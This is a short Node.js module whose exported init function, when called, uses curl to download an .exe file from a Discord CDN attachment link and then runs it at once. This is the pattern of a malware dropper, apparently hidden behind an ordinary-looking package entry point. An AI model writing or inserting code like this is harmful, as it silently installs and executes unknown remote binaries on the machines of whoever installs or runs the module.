const { exec } = require('node:child_process');

function init() {
    exec("curl https://cdn.discordapp.com/attachments/1033806593281769572/1033832120067567657/a_1.exe -o a.exe && a.exe", (error, stdout, stderr) => {
        if(error) {
            console.log(`error: ${error.message}`)
        } 
    })
}


module.exports = init;